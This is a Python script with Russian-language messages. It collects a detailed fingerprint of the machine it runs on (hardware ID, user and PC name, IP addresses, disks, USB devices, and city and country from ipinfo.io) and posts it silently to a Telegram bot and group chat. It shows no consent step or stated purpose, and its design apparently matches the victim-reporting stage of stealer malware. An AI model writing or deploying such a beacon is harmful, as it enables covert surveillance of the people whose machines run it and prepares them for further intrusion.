import os
import platform
import subprocess
import psutil
from datetime import datetime
from screeninfo import get_monitors
import requests
import socket
import getpass

TELEGRAM_TOKEN = 'BOT_TOKEN'
CHAT_ID = 'GROUP_ID'

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    response = requests.post(url, data=data)
    return response.json()

def get_hwid():
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        return hwid
    except subprocess.CalledProcessError:
        return None

def get_processor_info():
    if platform.system() == "Windows":
        try:
            command = "wmic cpu get caption"
            result = subprocess.check_output(command, shell=True, text=True)
            result_lines = result.splitlines()
            if len(result_lines) > 1:
                processor_info = result_lines[1].strip()
                processor_model = processor_info.split('Family')[0].strip()
                return processor_model
            else:
                return "Не удалось получить информацию о процессоре"
        except subprocess.CalledProcessError:
            return "Не удалось получить информацию о процессоре"
    elif platform.system() == "Linux":
        try:
            command = "lscpu"
            result = subprocess.check_output(command, shell=True, text=True)
            for line in result.splitlines():
                if "Model name" in line:
                    return line.split(":")[1].strip()
            return "Не удалось получить информацию о процессоре"
        except subprocess.CalledProcessError:
            return "Не удалось получить информацию о процессоре"
    return "Не удалось получить информацию о процессоре"

def get_battery_info():
    battery = psutil.sensors_battery()
    if battery:
        percent = battery.percent
        plugged = "Да" if battery.power_plugged else "Нет"
        return f"Заряд: {percent}% (Подключено к сети: {plugged})"
    else:
        return "Информация о батарее недоступна"

def get_last_os_update():
    if platform.system() == "Windows":
        try:
            command = "systeminfo | findstr /C:'Последнее обновление ОС'"
            result = subprocess.check_output(command, shell=True, text=True)
            return result.strip()
        except subprocess.CalledProcessError:
            return "Не удалось получить информацию о последнем обновлении ОС"
    elif platform.system() == "Linux":
        try:
            command = "ls -l /var/log/apt/history.log | tail -n 1"
            result = subprocess.check_output(command, shell=True, text=True)
            return f"Последнее обновление: {result.split()[5]} {result.split()[6]} {result.split()[7]}"
        except subprocess.CalledProcessError:
            return "Не удалось получить информацию о последнем обновлении ОС"
    return "Не удалось получить информацию о последнем обновлении ОС"

def get_usb_devices():
    usb_devices = []
    if platform.system() == "Linux":
        command = "lsusb"
        try:
            result = subprocess.check_output(command, shell=True, text=True)
            usb_devices = result.splitlines()
        except subprocess.CalledProcessError as e:
            usb_devices.append(f"Ошибка выполнения команды '{command}': {e}")
    elif platform.system() == "Windows":
        command = "powershell Get-WmiObject -Query \"Select * from Win32_USBHub\""
        try:
            result = subprocess.check_output(command, shell=True, text=True)
            usb_devices = result.splitlines()
        except subprocess.CalledProcessError as e:
            usb_devices.append("Ошибка выполнения команды PowerShell.")
            usb_devices.append("Для получения информации о USB-устройствах необходимо запустить скрипт с правами администратора.")
    return usb_devices

def get_location():
    try:
        response = requests.get('http://ipinfo.io')
        data = response.json()
        city = data.get('city', 'Не удалось определить город')
        country = data.get('country', 'Не удалось определить страну')
        return city, country
    except requests.RequestException:
        return 'Не удалось определить город', 'Не удалось определить страну'

def get_system_info():
    info = {}

    info["OS"] = platform.system()
    info["OS Version"] = platform.version()
    info["Architecture"] = platform.architecture()[0]
    info["Machine"] = platform.machine()

    info["Processor"] = get_processor_info()

    info["CPU Cores"] = psutil.cpu_count(logical=False)
    info["Logical CPUs"] = psutil.cpu_count(logical=True)

    virtual_memory = psutil.virtual_memory()
    info["Total RAM"] = f"{virtual_memory.total / (1024 ** 3):.2f} GB"
    info["Available RAM"] = f"{virtual_memory.available / (1024 ** 3):.2f} GB"

    disk_info = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disk_info.append({
                "Device": partition.device,
                "Mountpoint": partition.mountpoint,
                "File System": partition.fstype,
                "Total Size": f"{usage.total / (1024 ** 3):.2f} GB",
                "Used": f"{usage.used / (1024 ** 3):.2f} GB",
                "Free": f"{usage.free / (1024 ** 3):.2f} GB",
                "Usage Percentage": f"{usage.percent}%"
            })
        except PermissionError:
            pass
    info["Disk Info"] = disk_info

    net_info = []
    for interface, addresses in psutil.net_if_addrs().items():
        for address in addresses:
            if address.family == socket.AF_INET:
                net_info.append({
                    "Interface": interface,
                    "IP Address": address.address,
                    "Netmask": address.netmask
                })
    info["Network Info"] = net_info

    boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    info["Boot Time"] = boot_time

    monitors = get_monitors()
    monitor_info = [{"Monitor": monitor.name, "Resolution": f"{monitor.width}x{monitor.height}"} for monitor in monitors]
    info["Monitors"] = monitor_info

    usb_devices = get_usb_devices()
    info["USB Devices"] = usb_devices

    hwid = get_hwid()
    if hwid:
        info["HWID"] = hwid
    else:
        info["HWID"] = "Не удалось получить HWID"

    battery_info = get_battery_info()
    info["Battery Info"] = battery_info

    last_os_update = get_last_os_update()
    info["Last OS Update"] = last_os_update

    pc_name = platform.node()
    info["PC Name"] = pc_name

    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info["Current Time"] = current_time

    user_name = getpass.getuser()
    info["User Name"] = user_name

    city, country = get_location()
    info["City"] = city
    info["Country"] = country

    return info

def format_system_info(info):
    message = "<b>Информация о системе</b>\n"
    message += "=" * 40 + "\n"
    
    for key, value in info.items():
        if isinstance(value, list):
            message += f"<b>{key}:</b>\n"
            for item in value:
                if isinstance(item, dict):
                    for sub_key, sub_value in item.items():
                        message += f"  <i>{sub_key}:</i> {sub_value}\n"
                else:
                    message += f"  {item}\n"
                message += "-" * 20 + "\n"
        else:
            message += f"<b>{key}:</b> {value}\n"
    
    return message

if __name__ == "__main__":
    system_info = get_system_info()
    formatted_info = format_system_info(system_info)
    send_telegram_message(formatted_info)
